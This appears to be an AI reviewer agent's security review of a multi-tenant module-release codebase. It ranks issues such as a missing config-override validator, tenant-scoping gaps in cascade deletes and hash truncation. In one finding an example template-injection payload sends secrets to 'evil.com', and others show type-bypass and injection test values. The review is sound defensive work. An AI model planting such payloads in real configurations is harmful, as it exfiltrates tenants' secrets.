# Sprint 1 — Pass 5: Security Review (FINAL)

**Reviewer:** LLD Reviewer Agent (Security Pass — Final)
**Date:** 2026-03-22
**Scope:** All Sprint 1 implementation files (models, cascade-delete, project-io/module-release/\*, runtime types, trace-event) vs. LLD Section 11 (Security)
**Prior context:** None — independent review (no access to Pass 1-4 findings until after verdict)

---

## VERDICT: APPROVED_WITH_RESERVATIONS

Sprint 1's data layer and utility code is well-structured and demonstrably security-conscious. All four new models apply `tenantIsolationPlugin`, indexes are tenantId-prefixed, cross-tenant access returns null (not 403), the cascade delete paths include tenantId in new module entity deletions, the soft-delete function now includes a `kind: 'module'` guard, and the publish safety validator provides genuine two-tier defense against credential leaks. The code is safe to ship as a Sprint 1 foundation **with the reservation that Sprint 2 must implement `validateConfigOverrides` before any route handler writes to `ProjectModuleDependency.configOverrides`**.

The issues below are ranked by risk. Items marked "Sprint 2 prerequisite" must be resolved before the Sprint 2 route handlers are merged — they are not Sprint 1 blockers because no route handler currently writes to the affected paths.

---

## ISSUES

### CRITICAL

#### S5-C1: `validateConfigOverrides` is not implemented — SSTI vector requires Sprint 2 gate

**OWASP:** A03:2021 Injection (Server-Side Template Injection)
**LLD Section:** 11.2
**Status:** Not implemented — exists only as pseudocode in LLD (lines 1549-1597)
**Verified:** `grep -r 'validateConfigOverrides' packages/ apps/` returns zero hits in `.ts` source files (only spec, review docs, and implementation plan)

The LLD specifies a `validateConfigOverrides` function with six validation layers: (1) max 50 keys, (2) max 1 KB per value, (3) reject undeclared keys, (4) reject `isSecret` keys, (5) reject `{{` template syntax, (6) reject control characters.

**None of these validations exist in the codebase.** The `configOverrides` field on `ProjectModuleDependency` (line 59) uses `Schema.Types.Mixed` with no Mongoose or application-layer validation.

**Attack scenario:** A user with `module:import` permission stores `configOverrides: { API_BASE_URL: "http://evil.com/{{secrets.PAYMENT_KEY}}" }`. When interpolated into a module tool's HTTP endpoint template at runtime, this exfiltrates the consumer project's secrets via the attacker-controlled URL.

**Why this is Sprint 2-gated, not Sprint 1-blocking:** Sprint 1 contains no route handler that writes to `ProjectModuleDependency`. The model schema exists but has no HTTP ingress path. The SSTI vector activates only when Sprint 2 wires the import route.

**Required action for Sprint 2:**

1. Implement `validateConfigOverrides` in `packages/project-io/src/module-release/` exactly per LLD 11.2
2. Wire it as a blocking pre-save check in `POST /api/projects/[id]/module-dependencies` (import) and any update endpoint
3. Add type check: reject any value where `typeof value !== 'string'` (Mixed schema allows objects)
4. Consider using `{ type: Map, of: String }` instead of `Schema.Types.Mixed` on the model

---

### HIGH

#### S5-H1: `configOverrides` uses `Schema.Types.Mixed` — type bypass risk

**OWASP:** A03:2021 Injection
**File:** `packages/database/src/models/project-module-dependency.model.ts:59`
**LLD Section:** 1.4

The `configOverrides` field is declared as `Record<string, string>` in the TypeScript interface (line 32) but stored as `Schema.Types.Mixed` in the Mongoose schema (line 59). Mixed allows any BSON type — objects, arrays, numbers, nested documents. TypeScript types are erased at runtime; Mongoose types are not.

**Impact:** Even after `validateConfigOverrides` is implemented in Sprint 2, if the validation only operates on string values, an attacker could store `{ API_BASE_URL: { $gt: "" } }` or `{ API_BASE_URL: ["{{secrets.KEY}}"] }` to bypass string-pattern checks.

**Fix:** Change the schema to `{ type: Map, of: String }` or add a type guard in `validateConfigOverrides` that rejects non-string values. This can be addressed in Sprint 2 alongside S5-C1.

---

#### S5-H2: `deleteProject` optional `tenantId` widens module cascade blast radius

**OWASP:** A01:2021 Broken Access Control
**File:** `packages/database/src/cascade/cascade-delete.ts:186-189` (signature), `apps/runtime/src/repos/cascade-repo.ts:106` (call site)

The `deleteProject(projectId, tenantId?)` function makes `tenantId` optional. When omitted (as in `apps/runtime/src/repos/cascade-repo.ts:106` — `deleteProject(projectId)`):

1. The project lookup uses `{ _id: projectId }` (line 222) — no tenant scope
2. The resolved `projectTenantId` comes from the unscoped lookup result
3. All module cascade logic (Path A consumer check, Path B dependency/snapshot deletion) trusts this resolved value

A compromised or confused call site passing an arbitrary `projectId` could trigger cascade deletion of module entities across tenant boundaries because the initial project lookup is unscoped.

**Mitigating factor:** The `tenantIsolationPlugin` on the `Project` model injects the context tenant into queries when ALS is active, which would prevent cross-tenant lookups in normal request paths. The risk materializes only in contexts where ALS is not active (background jobs, CLI tools, tests).

**Pre-existing:** This was the existing `deleteProject` signature before Sprint 1. The module cascade paths (Path A/B) correctly pass `projectTenantId` to all new entity deletions.

**Fix (Sprint 2 or follow-up):** Make `tenantId` required in `deleteProject`. Update the runtime call site at `cascade-repo.ts:106` to pass `tenantId`. This is a backward-incompatible change so coordinate with existing callers.

---

#### S5-H3: `CascadeDeleteBlockedError.consumerProjectIds` is public — info disclosure vector

**OWASP:** A01:2021 Broken Access Control / A04:2021 Insecure Design
**File:** `packages/database/src/cascade/cascade-delete.ts:33`

The `consumerProjectIds` field is `public readonly`. While the JSDoc warns "Do NOT serialize this to HTTP responses", the field is accessible to any code that catches the error. Error serialization middleware, structured logging, and Sentry-style reporters routinely serialize all enumerable properties.

The consumer project IDs are cross-project data — a module owner should not learn which other projects depend on their module (only the count).

**Mitigating factor:** The cascade code limits the query to `.limit(100)` (line 242), bounding the leak. Route handlers are documented to expose only the count.

**Fix:** Either (a) make the field `#consumerProjectIds` (truly private) with a `get count()` accessor, or (b) remove the IDs from the error entirely and have the cascade function return a structured result with both the count and the IDs for internal logging only.

---

#### S5-H4: Hash truncation to 64 bits — birthday collision at ~2^32 releases

**OWASP:** N/A (Integrity)
**Files:** `packages/project-io/src/module-release/source-hash.ts:34`, `build-module-release.ts:161,177`

All three hashing locations use `.slice(0, 16)` (16 hex chars = 64 bits). Birthday collision probability reaches 50% at ~2^32 (~4 billion) hashes. While unlikely in a single deployment, the `sourceHash` is used for deduplication detection and may evolve toward uniqueness constraints (e.g., `insertOne` + catch `E11000` as specified in LLD 7.5).

**Current risk:** Low. The `sourceHash` is not currently a unique index and is only advisory.

**Future risk:** If `sourceHash` becomes an enforcement-grade dedup key, 64-bit collisions could cause false positives (rejecting a genuinely different release) or false negatives (accepting a duplicate with a different hash).

**Fix:** Use `.slice(0, 32)` (128 bits, birthday collision at ~2^64) for the `sourceHash`. Per-agent/per-tool hashes inside the artifact can remain at 64 bits since they are not used for global dedup.

---

### MEDIUM

#### S5-M1: Test fixture stores secret-like value in `configOverrides` — misleading example

**OWASP:** N/A (Secure Development Lifecycle)
**File:** `packages/database/src/__tests__/model-project-module-dependency.test.ts:41`

The test fixture uses `configOverrides: { API_KEY: 'sk-test-123' }` alongside a contract that declares `API_KEY` as `isSecret: true` (line 26). This combination would be rejected by `validateConfigOverrides` once implemented. Developers reading this test as an example of valid data will internalize the pattern that secrets can go into `configOverrides`.

**Fix:** Change the fixture to use a non-secret key: `configOverrides: { API_BASE_URL: 'https://api.example.com/v1' }` and update the contract to `requiredConfigKeys: [{ key: 'API_BASE_URL', isSecret: false }]`.

---

#### S5-M2: Standard cascade `deleteProject` uses `{ projectId }` without `tenantId` on non-module entities

**OWASP:** A01:2021 Broken Access Control
**File:** `packages/database/src/cascade/cascade-delete.ts:285-331`

The pre-existing standard cascade (sessions, agents, deployments, etc.) uses `deleteMany({ projectId })` without tenantId for 17+ entity types (lines 301-331). This is mitigated by the tenant isolation plugin when ALS is active, but creates a defense-in-depth gap.

The new module cascade paths (Path A/Path B, lines 249-280) correctly include `tenantId` in all `deleteMany` calls, establishing a better pattern.

**Pre-existing:** This is not a Sprint 1 regression. Noting it for awareness.

**Fix (follow-up):** Propagate `projectTenantId` into all standard cascade `deleteMany` calls to match the pattern established by the module cascade code.

---

#### S5-M3: No decompression guard on `DeploymentModuleSnapshot.compressedPayload`

**OWASP:** N/A (Availability — decompression bomb)
**File:** LLD Section 1.5 (lines 275-278) specifies both compress and decompress paths
**Status:** Neither compress nor decompress is implemented in Sprint 1

The LLD specifies:

- Write path: validate `JSON.stringify(payload).length <= 8_388_608` before gzip
- Read path: `zlib.gunzip(compressedPayload)` on retrieval

The read path has no `maxOutputLength` guard in the LLD specification. If a corrupted or maliciously crafted document contains a gzip bomb, `gunzipSync` would expand it to potentially GB of memory.

**Sprint 1 impact:** Zero — neither compression nor decompression is implemented yet. The model stores `compressedPayload: Buffer` but no Sprint 1 code reads or writes it.

**Sprint 2 action:** When implementing the deployment build service (Sprint 2 task 11), add `zlib.gunzipSync(payload, { maxOutputLength: 8_388_608 })` to bound decompression.

---

### LOW

#### S5-L1: `configOverrides` regex patterns in `validateConfigOverrides` spec are correct but untested

**OWASP:** N/A (Testing Gap)
**LLD Section:** 11.2

The LLD spec correctly uses `/\{\{/` (not `/\{\{.*?\}\}/`) for template injection detection, avoiding the newline bypass (`{{\nfoo}}`). It also correctly uses a character class regex for control characters. However, since the function is not implemented, these patterns are not tested.

**Sprint 2 action:** When implementing `validateConfigOverrides`, add explicit test cases for:

- `value: "{{secrets.KEY}}"` (blocked)
- `value: "{{\nsecrets.KEY}}"` (blocked by `/\{\{/` — the correct behavior)
- `value: "normal value"` (allowed)
- `value: "value\x00with_null"` (blocked)
- `value: { nested: "object" }` (blocked by type check — S5-H1)

---

#### S5-L2: `variableNamespaceIds` stripping only covers compiled IR, not DSL text

**File:** `packages/project-io/src/module-release/build-module-release.ts:266-286`
**LLD Section:** 11.1

The `stripVariableNamespaceIds` function recursively removes the `variableNamespaceIds` key from compiled IR objects. This is correct for the IR path. However, the raw DSL content stored in the artifact (`artifactAgents[name].dslContent`) is the original DSL string, which might contain `variableNamespaceIds` references in structured YAML format.

**Mitigating factor:** The publish safety validator (module-publish-safety.ts:82-83, 345-353) separately scans DSL text for `variableNamespaceId` patterns and emits a blocking issue. So the detection is covered, even if the stripping is IR-only.

**Impact:** Low. Defense-in-depth recommendation only.

---

## VERIFIED

### Tenant Isolation

- [x] All 4 new models (`ModuleRelease`, `ModuleEnvironmentPointer`, `ProjectModuleDependency`, `DeploymentModuleSnapshot`) apply `tenantIsolationPlugin`
- [x] All indexes are tenantId-prefixed: verified unique indexes on all 4 models
- [x] `resolveSelector` uses `findOne({ tenantId, ... })` for both version and environment paths
- [x] Environment pointer lookup uses `findOne({ tenantId, moduleProjectId, environment })`
- [x] Cross-tenant access returns null (triggers 404 at route handler level, not 403)
- [x] New cascade delete paths (Path A/B) include `tenantId` in all `deleteMany` calls
- [x] `softDeleteModuleProject` scopes by `{ _id, tenantId, kind: 'module' }` — includes both tenant and kind guards

### Publish Safety (LLD 11.1)

- [x] Tier 1 structural validation: HTTP tools checked for non-templated auth values
- [x] Tier 2 pattern-based: Base64, URL keys, PEM keys, secret prefixes all scanned
- [x] Non-portable warnings: SearchAI `indexId` and Workflow `workflowId` flagged
- [x] Source-project identifiers: `variableNamespaceIds`, raw `_id`, `projectId`, `tenantId` all scanned
- [x] `auth_profile_ref` and `{{env.*}}/{{config.*}}` templates correctly classified as safe
- [x] Template context check prevents false positives on template-wrapped values

### Data Model Security

- [x] `Project.kind` uses Mongoose `enum: ['application', 'module']` — no arbitrary values
- [x] `ModuleRelease.artifact/compiledIR/contract` use `Schema.Types.Mixed` (correct — complex nested objects, validated at application layer)
- [x] `ModuleRelease.archivedAt/archivedBy` defined in schema — soft-delete updates work with `strict: true`
- [x] `Project.archivedAt/archivedBy` defined in schema — same
- [x] `ModuleEnvironmentPointer.environment` uses `enum: ['dev', 'staging', 'production']`
- [x] `ModuleEnvironmentPointer.revision` supports optimistic concurrency
- [x] `ProjectModuleDependency.selector.type` uses `enum: ['version', 'environment']`
- [x] All models use `uuidv7` for `_id` generation — no sequential/predictable IDs

### Cascade Delete Security

- [x] Path A (module project): Blocks deletion when active consumers exist (throws `CascadeDeleteBlockedError`)
- [x] Path A: Consumer dependency count query scoped by `tenantId` (line 231-234)
- [x] Path A: Consumer ID fetch limited to `.limit(100)` — bounded memory
- [x] Path A: Deletes `ModuleEnvironmentPointer` and `ModuleRelease` scoped by `{ tenantId, moduleProjectId }`
- [x] Path B (consumer project): Deletes `ProjectModuleDependency` and `DeploymentModuleSnapshot` scoped by `{ tenantId, projectId }`
- [x] Tenant deletion (`deleteTenant`): Module entities deleted in correct dependency order (snapshots -> deps -> pointers -> releases)
- [x] Tenant deletion: All 4 module entity types included with `tenantId` scope
- [x] `softDeleteModuleProject` includes `kind: 'module'` guard in query filter

### IR Stripping

- [x] `stripVariableNamespaceIds` recursively walks all nested objects and arrays
- [x] Handles arrays-of-arrays via `stripDeep` recursion
- [x] Only strips `variableNamespaceIds` key — no collateral damage to other fields

### Contract Extraction

- [x] Reuses vetted `extractEnvVarReferences`, `extractSecretReferences`, `extractAuthProfileReferences` from export layer
- [x] Scans both agents and tools for all reference types
- [x] Deduplicates references via `Set` before contract assembly
- [x] `requiredConfigKeys.isSecret` correctly derived from `{{secrets.KEY}}` vs `{{config.KEY}}`

### Module Selector

- [x] Both version and environment paths scope queries by `tenantId`
- [x] Archived releases excluded via `archivedAt: null` filter
- [x] Environment pointer resolution performs a second `findOne` to verify the pointed-to release is not archived

### TraceEvent Extension

- [x] `tool_auth_resolved` added to `TraceEventType` union — new events will not be silently dropped
- [x] Module provenance fields (`moduleAlias`, `moduleProjectId`, `moduleReleaseId`, `sourceAgentName`) added as optional fields — backward compatible

### Runtime Types

- [x] `ModuleProvenance` tracks full lineage: alias, moduleProjectId, moduleReleaseId, sourceAgentName
- [x] `ResolvedAgentIR` and `ResolvedToolDefinition` use optional `_moduleProvenance` — non-breaking extension
- [x] `DeploymentModuleSnapshotPayload` shape matches LLD specification
- [x] `_moduleProvenance` uses underscore prefix to avoid collision with IR fields

---

## SECURITY POSTURE SUMMARY

| Area                               | Rating              | Notes                                          |
| ---------------------------------- | ------------------- | ---------------------------------------------- |
| Tenant isolation                   | **Strong**          | Plugin + explicit tenantId in all queries      |
| Cross-tenant access                | **Strong**          | Returns null/404, never 403                    |
| Credential leak prevention         | **Strong**          | Two-tier publish safety validator              |
| Input validation (configOverrides) | **Not implemented** | S5-C1 — Sprint 2 prerequisite                  |
| Cascade delete                     | **Good**            | New paths correct; pre-existing gaps noted     |
| Soft delete                        | **Good**            | Kind guard present                             |
| Schema type safety                 | **Adequate**        | Mixed type on configOverrides is a gap (S5-H1) |
| Hash integrity                     | **Adequate**        | 64-bit truncation is advisory-only for now     |
| Error information disclosure       | **Adequate**        | JSDoc warning present but not enforced (S5-H3) |

---

## SPRINT 2 SECURITY PREREQUISITES

These items MUST be addressed in Sprint 2 before the import route handler is merged:

1. **Implement `validateConfigOverrides`** (S5-C1) — the single most important security action
2. **Type-guard `configOverrides` values** (S5-H1) — either Mongoose `Map<String>` or explicit typeof check
3. **Add `maxOutputLength` to decompression** (S5-M3) — when deployment build service is implemented
4. **Fix test fixture** (S5-M1) — before Sprint 2 developers use it as a template

---

## NOTES FOR IMPLEMENTATION

1. The `tenantIsolationPlugin` provides strong defense-in-depth for all ALS-active request paths. The remaining gaps (S5-H2, S5-M2) only manifest in ALS-absent contexts (background jobs, CLI tools). Sprint 1 code does not introduce new ALS-absent call paths.

2. The publish safety validator (`module-publish-safety.ts`) is the most thorough security component in Sprint 1. Its regex patterns correctly handle edge cases (template context checks, newline-safe patterns, Base64 heuristics). This code is ready for production use.

3. The `softDeleteModuleProject` function now includes `kind: 'module'` in its query filter (line 376), which is a defense-in-depth improvement over what was flagged in prior passes. This prevents accidental archival of application projects.

4. All 4 model barrel exports are registered in `packages/database/src/models/index.ts` (lines 152-168), ensuring cascade delete and other consumers can import them.
